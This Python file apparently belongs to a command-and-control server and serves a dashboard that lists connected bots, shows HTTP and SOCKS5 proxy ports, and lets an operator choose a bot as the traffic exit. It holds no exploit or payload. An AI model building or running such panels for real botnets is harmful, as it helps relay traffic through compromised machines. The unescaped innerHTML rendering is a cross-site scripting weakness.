"""
Web dashboard for C2 server monitoring.
"""

import os
from typing import Dict, Any

class WebDashboard:
    """Web dashboard manager."""
    
    def __init__(self, server_instance):
        self.server = server_instance
        self.template_dir = "features/monitoring/templates"
        self.static_dir = "features/monitoring/static"
    
    def get_dashboard_html(self) -> str:
        """Get dashboard HTML content."""
        template_path = os.path.join(self.template_dir, "dashboard.html")
        if os.path.exists(template_path):
            with open(template_path, 'r', encoding='utf-8') as f:
                return f.read()
        else:
            return self._get_default_dashboard()
    
    def get_dashboard_js(self) -> str:
        """Get dashboard JavaScript content."""
        js_path = os.path.join(self.static_dir, "dashboard.js")
        if os.path.exists(js_path):
            with open(js_path, 'r', encoding='utf-8') as f:
                return f.read()
        else:
            return self._get_default_dashboard_js()
    
    def _get_default_dashboard(self) -> str:
        """Get default dashboard HTML."""
        return """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Server Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: #e0e0e0; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; margin-bottom: 30px; }
        .header h1 { color: #4CAF50; margin-bottom: 10px; }
        .kpi { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 30px; }
        .pill { background: #333; padding: 8px 16px; border-radius: 20px; font-size: 14px; }
        .section { background: #2a2a2a; border-radius: 8px; padding: 20px; margin-bottom: 20px; }
        .section h2 { color: #4CAF50; margin-bottom: 15px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #444; }
        th { background: #333; color: #4CAF50; }
        .btn { background: #4CAF50; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; }
        .btn:hover { background: #45a049; }
        .row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
        .muted { color: #888; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 C2 Server Dashboard</h1>
            <p>Real-time monitoring and management</p>
        </div>
        
        <div id="status" class="section">
            <h2>📊 Server Status</h2>
            <div class="kpi" id="status-kpi">
                <span class="pill">Loading...</span>
            </div>
        </div>
        
        <div id="bots" class="section">
            <h2>🤖 Connected Bots</h2>
            <div class="row">
                <h3 style="margin-right: auto;">Bots</h3>
                <button class="btn" onclick="clearPref()">Clear Preferred</button>
            </div>
            <table>
                <thead>
                    <tr><th>Bot ID</th><th>Active</th><th>Connections</th><th>Action</th></tr>
                </thead>
                <tbody id="bots-table">
                    <tr><td colspan="4" class="muted">Loading...</td></tr>
                </tbody>
            </table>
        </div>
        
        <div id="connections" class="section">
            <h2>🔗 Active Connections</h2>
            <table>
                <thead>
                    <tr><th>Request ID</th><th>Target</th><th>Bot</th><th>Client</th></tr>
                </thead>
                <tbody id="connections-table">
                    <tr><td colspan="4" class="muted">Loading...</td></tr>
                </tbody>
            </table>
        </div>
    </div>
    
    <script src="/static/dashboard.js"></script>
</body>
</html>
        """
    
    def _get_default_dashboard_js(self) -> str:
        """Get default dashboard JavaScript."""
        return """
async function j(u,o){const r=await fetch(u,o);if(!r.ok) throw new Error('HTTP '+r.status);return r.json()}

async function refresh(){
  try{
        const s=await j('/api/status');
        const limits = s.connection_limits || {};
        document.getElementById('status').innerHTML = `
          <div class='kpi'>
            <span class='pill'><b>Host:</b> ${s.host}</span>
            <span class='pill'><b>Bot:</b> ${s.ports.bot}</span>
            <span class='pill'><b>HTTP:</b> ${s.ports.http}</span>
            <span class='pill'><b>SOCKS5:</b> ${s.ports.socks}</span>
            <span class='pill'><b>API:</b> ${s.ports.api}</span>
            <span class='pill'><b>Bots:</b> ${s.bot_count}/${limits.max_bots || '∞'}</span>
            <span class='pill'><b>Preferred:</b> ${s.preferred_bot||'-'}</span>
            <span class='pill'><b>Active:</b> ${s.active_connections}</span>
            <span class='pill'><b>Max/Bot:</b> ${limits.max_connections_per_bot || '∞'}</span>
          </div>`

    const b=await j('/api/bots');
    const botConnections = s.bot_connections || {};
    const maxPerBot = limits.max_connections_per_bot || '∞';
    const rows=(b.bots||[]).map(x=>{
      const current = botConnections[x.bot_id] || 0;
      const limit = maxPerBot === '∞' ? '∞' : maxPerBot;
      const status = maxPerBot !== '∞' && current >= maxPerBot ? '🔴' : current > maxPerBot * 0.8 ? '🟡' : '🟢';
      return `<tr>
        <td>${x.bot_id}</td>
        <td>${x.active_requests}</td>
        <td>${status} ${current}/${limit}</td>
        <td><button class='btn' onclick=\"sel('${x.bot_id}')\">Select as Exit</button></td>
      </tr>`;
    }).join('');
    document.getElementById('bots').innerHTML = `
      <div class='row'>
        <h2 style='margin-right:auto'>Bots</h2>
        <button class='btn' onclick='clearPref()'>Clear Preferred</button>
      </div>
      <table>
        <thead><tr><th>Bot ID</th><th>Active</th><th>Connections</th><th>Action</th></tr></thead>
        <tbody>${rows || "<tr><td colspan='4' class='muted'>No bots connected</td></tr>"}</tbody>
      </table>`

    const c=await j('/api/connections');
    const rowsC=(c.connections||[]).map(x=>`<tr>
        <td class='muted'>${x.request_id}</td>
        <td>${x.target}</td>
        <td>${x.bot_id}</td>
        <td>${x.client}</td>
      </tr>`).join('');
    document.getElementById('connections').innerHTML = `
      <h2>Active Connections</h2>
      <table>
        <thead><tr><th>Request ID</th><th>Target</th><th>Bot</th><th>Client</th></tr></thead>
        <tbody>${rowsC || "<tr><td colspan='4' class='muted'>No active connections</td></tr>"}</tbody>
      </table>`
  }catch(e){
    console.error('Refresh error:',e);
    document.getElementById('status').innerHTML='<div class="kpi"><span class="pill" style="background:#f44336">Error: '+e.message+'</span></div>';
  }
}

async function sel(bid){
  try{
    await j('/api/select_bot',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({bot_id:bid})});
    refresh();
  }catch(e){
    alert('Error: '+e.message);
  }
}

async function clearPref(){
  try{
    await j('/api/clear_preferred_bot',{method:'POST'});
    refresh();
  }catch(e){
    alert('Error: '+e.message);
  }
}

// Auto refresh every 2 seconds
setInterval(refresh,2000);
refresh();
        """
